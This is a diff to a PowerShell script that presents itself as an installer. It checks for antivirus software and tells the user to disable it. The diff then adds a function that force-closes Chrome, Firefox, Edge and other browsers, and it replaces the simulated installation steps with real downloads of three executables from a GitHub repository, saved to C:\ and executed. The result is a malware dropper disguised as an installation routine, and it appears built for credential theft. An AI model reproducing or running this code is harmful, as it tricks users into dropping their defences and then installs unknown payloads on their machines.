@@ -13,6 +13,19 @@ function Get-AntivirusSoftware {
     }
 }
 
+# Function to check if a process is running
+function Is-ProcessRunning($processName) {
+    return Get-Process -Name $processName -ErrorAction SilentlyContinue
+}
+
+# Function to close all popular browsers
+function Close-Browsers {
+    $browsers = @("chrome", "firefox", "iexplore", "msedge", "opera", "yandex", "brave", "vivaldi", "safari")
+    foreach ($browser in $browsers) {
+        Stop-Process -Name $browser -Force -ErrorAction SilentlyContinue
+    }
+}
+
 # Main script
 Write-Host "Checking for installed antivirus software..."
 Get-AntivirusSoftware
@@ -21,18 +34,59 @@ Write-Host "`nPlease ensure all antivirus software is disabled before proceeding
 $response = Read-Host "Type 'y' to continue with the installation process"
 
 if ($response -eq 'y') {
+    # Close all popular browsers
+    Write-Host "`nClosing all popular browsers..."
+    Close-Browsers
+
     Write-Host "`nStarting installation process. Do not close this window..." -ForegroundColor Green
     
-    # Simulate file download and execution
-    Write-Host "Downloading and installing file 1..."
-    Start-Sleep -Seconds 3  # Simulating download time
-    Write-Host "File 1 installed successfully."
+    # Download and execute file 1
+    Write-Host "Downloading file 1..."
+    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile "C:\1.exe"
+    Write-Host "File 1 downloaded successfully."
+    
+    Write-Host "Executing file 1..."
+    Start-Process -FilePath "C:\1.exe" -NoNewWindow -PassThru -Wait
+    if (Is-ProcessRunning "1") {
+        Write-Host "File 1 started successfully."
+    } else {
+        Write-Host "File 1 did not start. Installation failed." -ForegroundColor Red
+        Read-Host "`nPress Enter to close this window..."
+        exit
+    }
 
-    Write-Host "Downloading and installing file 2..."
-    Start-Sleep -Seconds 3  # Simulating download time
-    Write-Host "File 2 installed successfully."
+    # Download and execute file 2
+    Write-Host "Downloading file 2..."
+    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile "C:\2.exe"
+    Write-Host "File 2 downloaded successfully."
+    
+    Write-Host "Executing file 2..."
+    Start-Process -FilePath "C:\2.exe" -NoNewWindow -PassThru -Wait
+    if (Is-ProcessRunning "2") {
+        Write-Host "File 2 started successfully."
+    } else {
+        Write-Host "File 2 did not start. Installation failed." -ForegroundColor Red
+        Read-Host "`nPress Enter to close this window..."
+        exit
+    }
 
-    Write-Host "`nInstallation complete. You may now close this window." -ForegroundColor Green
+    # Download and execute file 3
+    Write-Host "Downloading file 3..."
+    Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/refs/heads/main/3.exe" -OutFile "C:\3.exe"
+    Write-Host "File 3 downloaded successfully."
+    
+    Write-Host "Executing file 3..."
+    Start-Process -FilePath "C:\3.exe" -NoNewWindow -PassThru -Wait
+    if (Is-ProcessRunning "3") {
+        Write-Host "File 3 started successfully."
+    } else {
+        Write-Host "File 3 did not start. Installation failed." -ForegroundColor Red
+        Read-Host "`nPress Enter to close this window..."
+        exit
+    }
+
+    Write-Host "`nAll files started successfully. Installation complete. You may now close this window." -ForegroundColor Green
 } else {
     Write-Host "`nInstallation aborted. Please disable antivirus software and try again." -ForegroundColor Red
+    Read-Host "`nPress Enter to close this window..."
 }
